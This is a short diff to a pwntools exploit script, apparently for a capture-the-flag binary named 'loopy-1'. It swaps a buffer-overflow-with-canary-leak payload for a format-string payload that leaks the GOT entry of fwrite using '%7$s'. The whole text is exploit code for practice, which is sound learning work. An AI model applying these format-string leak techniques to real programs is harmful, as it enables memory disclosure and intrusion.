@@ -3,12 +3,12 @@
 from pwn import *
 
 p = process('./loopy-1')
-print p.recv()
-offset = 59
-canary = '%23$x'
+e = ELF('./loopy-1')
+fwrite_got = e.got['fwrite']
+
+
 payload = ''
-payload+= 'A'*offset
-payload+= canary
-payload+= 'BBBB'
+payload+= p32(fwrite_got)
+payload+= '%7$s'
 p.sendline(payload)
 p.interactive()
